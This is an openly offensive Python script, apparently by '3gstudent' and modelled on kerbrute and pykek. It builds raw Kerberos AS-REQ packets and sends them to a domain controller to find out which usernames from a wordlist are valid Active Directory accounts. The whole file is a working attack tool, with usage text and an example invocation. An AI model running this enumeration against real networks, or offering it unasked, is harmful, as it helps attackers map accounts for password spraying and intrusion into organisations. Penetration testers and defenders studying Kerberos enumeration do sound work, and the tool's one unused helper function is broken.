#!/usr/bin/python
import sys, os
import socket
from random import getrandbits
from time import time, localtime, strftime
from pyasn1.type.univ import Integer, Sequence, SequenceOf, OctetString, BitString, Boolean
from pyasn1.type.char import GeneralString
from pyasn1.type.useful import GeneralizedTime
from pyasn1.type.tag import Tag, tagClassContext, tagClassApplication, tagFormatSimple
from pyasn1.codec.der.encoder import encode
from struct import pack, unpack
from pyasn1.type.namedtype import NamedTypes, NamedType, OptionalNamedType
from _crypto import ARC4, MD5, MD4

RC4_HMAC = 23
NT_PRINCIPAL = 1
NT_SRV_INST =2

def ntlm_hash(pwd):
    return MD4.new(pwd.encode('utf-16le'))

def _c(n, t):
    return t.clone(tagSet=t.tagSet + Tag(tagClassContext, tagFormatSimple, n))

def _v(n, t):
    return t.clone(tagSet=t.tagSet + Tag(tagClassContext, tagFormatSimple, n), cloneValueFlag=True)


def application(n):
    return Sequence.tagSet + Tag(tagClassApplication, tagFormatSimple, n)


class KerberosString(GeneralString): pass

class Realm(KerberosString): pass

class PrincipalName(Sequence):
    componentType = NamedTypes(
        NamedType('name-type', _c(0, Integer())),
        NamedType('name-string', _c(1, SequenceOf(componentType=KerberosString()))))

class KerberosTime(GeneralizedTime): pass

class HostAddress(Sequence):
    componentType = NamedTypes(
        NamedType('addr-type', _c(0, Integer())),
        NamedType('address', _c(1, OctetString())))

class HostAddresses(SequenceOf):
    componentType = HostAddress()


class PAData(Sequence):
    componentType = NamedTypes(
        NamedType('padata-type', _c(1, Integer())),
        NamedType('padata-value', _c(2, OctetString())))

    
class KerberosFlags(BitString): pass

class EncryptedData(Sequence):
    componentType = NamedTypes(
        NamedType('etype', _c(0, Integer())),
        OptionalNamedType('kvno', _c(1, Integer())),
        NamedType('cipher', _c(2, OctetString())))



class Ticket(Sequence):
    tagSet = application(1)
    componentType = NamedTypes(
        NamedType('tkt-vno', _c(0, Integer())),
        NamedType('realm', _c(1, Realm())),
        NamedType('sname', _c(2, PrincipalName())),
        NamedType('enc-part', _c(3, EncryptedData())))
    
class KDCOptions(KerberosFlags): pass

class KdcReqBody(Sequence):
    componentType = NamedTypes(
        NamedType('kdc-options', _c(0, KDCOptions())),
        OptionalNamedType('cname', _c(1, PrincipalName())),
        NamedType('realm', _c(2, Realm())),
        OptionalNamedType('sname', _c(3, PrincipalName())),
        OptionalNamedType('from', _c(4, KerberosTime())),
        NamedType('till', _c(5, KerberosTime())),
        OptionalNamedType('rtime', _c(6, KerberosTime())),
        NamedType('nonce', _c(7, Integer())),
        NamedType('etype', _c(8, SequenceOf(componentType=Integer()))))

class KdcReq(Sequence):
    componentType = NamedTypes(
        NamedType('pvno', _c(1, Integer())),
        NamedType('msg-type', _c(2, Integer())),
        NamedType('padata', _c(3, SequenceOf(componentType=PAData()))),
        NamedType('req-body', _c(4, KdcReqBody())))


class AsReq(KdcReq):
    tagSet = application(10)

def build_req_body(realm, service, host, nonce, cname=None):
 
    req_body = KdcReqBody()

    # (Forwardable, Proxiable, Renewable, Canonicalize)
#   req_body['kdc-options'] = "'01010000100000000000000000000000'B"
    req_body['kdc-options'] = "'00000000000000000000000000010000'B"
    if cname is not None:
        req_body['cname'] = None
        req_body['cname']
        req_body['cname']['name-type'] = NT_PRINCIPAL
        req_body['cname']['name-string'] = None
        req_body['cname']['name-string'][0] = cname

    req_body['realm'] = realm

    req_body['sname'] = None
    req_body['sname']['name-type'] = NT_SRV_INST
    req_body['sname']['name-string'] = None
    req_body['sname']['name-string'][0] = service
    req_body['sname']['name-string'][1] = host

    req_body['till'] = '19700101000000Z'
    
    req_body['nonce'] = nonce

    req_body['etype'] = None
    req_body['etype'][0] = RC4_HMAC
    
    return req_body


def build_as_req(target_realm, user_name, nonce):
    req_body = build_req_body(target_realm, 'krbtgt', target_realm, nonce, cname=user_name)

    as_req = AsReq()

    as_req['pvno'] = 5
    as_req['msg-type'] = 10

    as_req['padata'] = None

    as_req['req-body'] = _v(4, req_body)

    return as_req

def send_req_tcp(req, kdc, port=88):
    data = encode(req)
    data = pack('>I', len(data)) + data
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((kdc, port))
    sock.send(data)
    return sock

def send_req_udp(req, kdc, port=88):
    data = encode(req)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((kdc, port))
    sock.send(data)
    return sock

def recv_rep_tcp(sock):
    data = ''
    datalen = None
    while True:
        rep = sock.recv(8192)
        if not rep:
            sock.close()
            raise IOError('Connection error')
        data += rep
        if len(rep) >= 4:
            if datalen is None:
                datalen = unpack('>I', rep[:4])[0]
            if len(data) >= 4 + datalen:
                sock.close()
                return data[4:4 + datalen]

def recv_rep_udp(sock):
    data = ''
    datalen = None
    while True:
        rep = sock.recv(8192)
        if not rep:
            sock.close()
            raise IOError('Connection error')
        data += rep
        if len(rep) >= 4:
            sock.close()
            return data


def _decrypt_rep(data, key, spec, enc_spec, msg_type):
    rep = decode(data, asn1Spec=spec)[0]
    rep_enc = str(rep['enc-part']['cipher'])
    rep_enc = decrypt(key[0], key[1], msg_type, rep_enc)
    rep_enc = decode(rep_enc, asn1Spec=enc_spec)[0]
    
    return rep, rep_enc
    

def checkuser_tcp(user_realm, user_name, kdc_a):
     
    nonce = getrandbits(31)  
    as_req = build_as_req(user_realm, user_name, nonce)
    sock = send_req_tcp(as_req, kdc_a)
    data = recv_rep_tcp(sock)
    i=0
    for c in data:       
        i=i+1
        if(i==47):
            if(ord(c)==0x19):
                print('[+] Valid user: %s'%(user_name))

def checkuser_udp(user_realm, user_name, kdc_a):
     
    nonce = getrandbits(31)  
    as_req = build_as_req(user_realm, user_name, nonce)
    sock = send_req_udp(as_req, kdc_a)
    data = recv_rep_udp(sock)
    i=0
    for c in data:       
        i=i+1
        if(i==47):
            if(ord(c)==0x19):
                print('[+] Valid user: %s'%(user_name))
        
if __name__ == '__main__':

        
    if len(sys.argv)!=5:
        print('[!]Wrong parameter')
        print('Use Kerberos pre-authentication to enumerate valid Active Directory accounts.')
        print('Reference:')
        print('  https://github.com/ropnop/kerbrute')
        print('  https://github.com/mubix/pykek')
        print('Author: 3gstudent')
	print('Usage:')
	print('	%s <domainControlerAddr> <domainName> <file> <mode>'%(sys.argv[0]))
        print('<mode>: tcp or udp')
	print('Eg.')
	print('	%s 192.168.1.1 test.com user.txt tcp'%(sys.argv[0]))
	
	sys.exit(0)
    else:
        kdc_a = sys.argv[1]
        user_realm = sys.argv[2].upper()
        print('[*] DomainControlerAddr: %s'%(kdc_a))
        print('[*] DomainName:          %s'%(user_realm))
        print('[*] UserFile:            %s'%(sys.argv[3]))
        file_object = open(sys.argv[3], 'r')
        if sys.argv[4]=='tcp':
            print('[*] Using TCP to enumerate valid Active Directory accounts.')
            for line in file_object:
                checkuser_tcp(user_realm, line.strip('\r\n'), kdc_a)
        elif sys.argv[4]=='udp':
            print('[*] Using UDP to enumerate valid Active Directory accounts.')  
            for line in file_object:
                checkuser_udp(user_realm, line.strip('\r\n'), kdc_a)
        else:
            print('[!]Wrong parameter')
            sys.exit(0)     


        print('All done.')
